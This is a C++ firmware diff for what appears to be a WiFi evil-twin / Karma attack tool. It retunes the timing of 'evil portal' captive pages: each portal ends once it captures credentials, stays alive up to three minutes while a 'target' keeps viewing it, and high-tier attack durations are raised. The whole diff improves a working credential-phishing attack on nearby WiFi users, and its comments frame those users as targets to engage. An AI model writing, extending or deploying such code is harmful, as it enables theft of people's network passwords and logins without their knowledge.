@@ -1701,7 +1701,7 @@ void checkPortals() {
         lastPortalHeartbeat = now;
         return;
     }
-    if (activePortal->instance == nullptr || (now - activePortal->launchTime > PORTAL_MAX_IDLE)) {
+    if (activePortal->instance == nullptr) {
         destroyActivePortal();
         lastPortalHeartbeat = now;
         return;
@@ -1710,15 +1710,34 @@ void checkPortals() {
     if (activePortal->instance != nullptr) {
         activePortal->instance->checkAndExtendDuration();
         
-        unsigned long effectiveDuration = activePortal->duration;
-        if (activePortal->instance->hasRecentActivity()) {
-            effectiveDuration = attackConfig.extendedDuration;
-        }
+        unsigned long portalAge = now - activePortal->launchTime;
         
-        if ((now - activePortal->launchTime) > effectiveDuration) {
+        // If we got credentials, terminate immediately
+        if (activePortal->instance->hasCredentials()) {
             destroyActivePortal();
             lastPortalHeartbeat = now;
             return;
+        }
+        
+        // Check if target is engaged (viewed portal recently)
+        bool targetEngaged = activePortal->instance->hasRecentPageView();
+        
+        if (targetEngaged) {
+            // Target is actively viewing the portal - keep alive
+            // 3 minute absolute safety cap (180,000 ms)
+            if (portalAge > 180000) { // 3 minutes max
+                destroyActivePortal();
+                lastPortalHeartbeat = now;
+                return;
+            }
+            // Portal stays alive - no timeout when engaged
+        } else {
+            // No engagement - short 15 second timeout
+            if (portalAge > attackConfig.baseDuration) { // 15000 ms (15 seconds)
+                destroyActivePortal();
+                lastPortalHeartbeat = now;
+                return;
+            }
         }
     }
 
@@ -1743,6 +1762,8 @@ void checkPortals() {
             activePortal->portalId
         );
         destroyActivePortal();
+        lastPortalHeartbeat = now;
+        return;
     }
 
     lastPortalHeartbeat = now;
@@ -2074,7 +2095,7 @@ void checkPendingPortals() {
     executeTieredAttackStrategy();
 }
 
-static bool portalIsActive() { return activePortal != nullptr; }
+static bool __attribute__((unused)) portalIsActive() { return activePortal != nullptr; }
 
 void launchManualEvilPortal(const String &ssid, uint8_t channel, bool verifyPwd) {
     (void)verifyPwd;
@@ -2665,13 +2686,13 @@ void karma_setup() {
     attackConfig.priorityThreshold = 40;
     attackConfig.cloneThreshold = 5;
     attackConfig.enableBeaconing = false;
-    attackConfig.highTierDuration = 60000;
+    attackConfig.highTierDuration = 180000;
     attackConfig.mediumTierDuration = 30000;
     attackConfig.fastTierDuration = 15000;
     attackConfig.cloneDuration = 90000;
     attackConfig.maxCloneNetworks = 2;
     attackConfig.baseDuration = 15000;
-    attackConfig.extendedDuration = 60000;
+    attackConfig.extendedDuration = 180000;
 
     handshakeCaptureEnabled = false;
 
